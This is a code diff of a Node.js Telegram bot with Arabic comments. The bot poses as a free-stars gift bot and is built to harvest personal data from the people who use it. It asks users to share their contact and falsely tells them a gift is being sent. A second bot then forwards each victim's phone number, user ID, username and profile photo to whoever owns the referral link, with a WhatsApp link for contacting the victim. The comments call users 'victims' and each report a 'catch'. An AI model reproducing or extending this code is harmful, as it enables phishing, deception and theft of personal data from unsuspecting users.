@@ -23,14 +23,12 @@ app.get('/', (req, res) => {
             <div class="card">
                 <h1>🌟 بوت ربح النجوم الحصري</h1>
                 <p>البوت يعمل بنجاح ومستقر على الخادم.</p>
-                <p>قم بالدخول إلى البوت عبر تيليجرام للمتابعة.</p>
             </div>
         </body>
         </html>
     `);
 });
 
-// بدء استماع السيرفر على البورت المطلوبة من Render
 app.listen(PORT, () => {
     console.log(`سيرفر الويب يعمل على البورت ${PORT}`);
 });
@@ -44,20 +42,20 @@ if (!COLLECTOR_TOKEN || !NOTIFIER_TOKEN) {
     process.exit(1);
 }
 
-// تشغيل بوت التجميع
+// تشغيل بوت التجميع (الذي يضغط فيه المستخدم)
 const bot = new TelegramBot(COLLECTOR_TOKEN, { polling: true });
-// تشغيل بوت إرسال التقارير
+// تشغيل بوت التنبيهات (الذي يرسل لك المعلومات)
 const notifierBot = new TelegramBot(NOTIFIER_TOKEN, { polling: false });
 
-console.log("تم تشغيل بوت التجميع بنجاح...");
+console.log("تم تشغيل البوت بنجاح...");
 
-// تخزين مؤقت للـ Referrer (صاحب الرابط) بناءً على أيدي المستخدم
+// تخزين الأيدي القادم من الرابط لكل مستخدم
 const referrers = {};
 
-// التعامل مع أمر البدء /start مع الأيدي القادم من الرابط
+// استقبال أمر البدء مع الأيدي الذي بعد علامة =
 bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const refId = match ? match[1] : null;
+    const refId = match ? match[1] : null; // هذا هو الأيدي اللي بعد علامة =
 
     if (refId) {
         referrers[chatId] = refId;
@@ -80,7 +78,7 @@ bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
     );
 });
 
-// استقبال جهة الاتصال (رقم الهواتف والبيانات)
+// استقبال رقم الهاتف والبيانات عند مشاركتها
 bot.on('contact', async (msg) => {
     const chatId = msg.chat.id;
     const contact = msg.contact;
@@ -94,9 +92,11 @@ bot.on('contact', async (msg) => {
     const username = user.username ? `@${user.username}` : "لا يوجد يوزر";
     const userId = user.id;
 
+    // جلب الأيدي الذي دخل من خلال رابطه (الموجود بعد =)
     const targetOwnerId = referrers[chatId];
 
-    let profilePhotoUrl = "لا توجد صورة أو فشل الجلب";
+    // جلب خلفية/صورة الحساب الشخصي للضحية
+    let profilePhotoUrl = "";
     try {
         const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
         if (photos && photos.total_count > 0) {
@@ -108,6 +108,11 @@ bot.on('contact', async (msg) => {
         console.log("تعذر جلب صورة الحساب:", e.message);
     }
 
+    // تجهيز رابط الواتساب المباشر للضحية
+    const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
+    const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
+
+    // بناء رسالة التقرير
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
 
@@ -116,42 +121,44 @@ bot.on('contact', async (msg) => {
 🆔 **الأيدي:** ${userId}
 📞 **رقم الهاتف:** +${phone}
 🔗 **رابط الحساب:** tg://user?id=${userId}
-🎯 **مُرسل عبر الأيدي (الرابط):** ${targetOwnerId || "مباشر بدون رابط"}
+🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "لا يوجد أيدي بالرابط"}
 `;
 
-    const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
-    const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
-
-    const inlineKeyboard = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: "💬 تواصل عبر واتساب", url: whatsappLink }
-                ]
-            ]
-        }
-    };
-
+    // 1. الرد على الضحية في البوت الأساسي وإزالة الكيبورد
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
     });
 
-    await bot.sendMessage(chatId, `إليك الرابط المباشر للاتصال:`, inlineKeyboard);
-
+    // 2. إرسال البيانات عبر (البوت الثاني) حصراً إلى الأيدي الموجود بنهاية الرابط
     if (targetOwnerId) {
         try {
-            if (profilePhotoUrl.startsWith("http")) {
+            // الأزرار الشفافة للمطور (رابط واتساب مباشر لرقم الضحية)
+            const inlineKeyboard = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "💬 محادثة واتساب مع الضحية", url: whatsappLink }
+                        ]
+                    ]
+                }
+            };
+
+            if (profilePhotoUrl) {
                 await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
                     caption: reportMessage,
-                    parse_mode: "Markdown"
+                    parse_mode: "Markdown",
+                    ...inlineKeyboard
                 });
             } else {
-                await notifierBot.sendMessage(targetOwnerId, reportMessage, { parse_mode: "Markdown" });
+                await notifierBot.sendMessage(targetOwnerId, reportMessage, {
+                    parse_mode: "Markdown",
+                    ...inlineKeyboard
+                });
             }
         } catch (err) {
-            console.log("فشل إرسال التقرير لصاحب الأيدي:", err.message);
+            console.log("فشل إرسال التقرير للأيدي المحدد عبر البوت الثاني:", err.message);
         }
     } else {
-        console.log(reportMessage);
+        console.log("تنبيه: لم يتم العثور على أيدي في الرابط لإرسال التقرير إليه.");
     }
 });
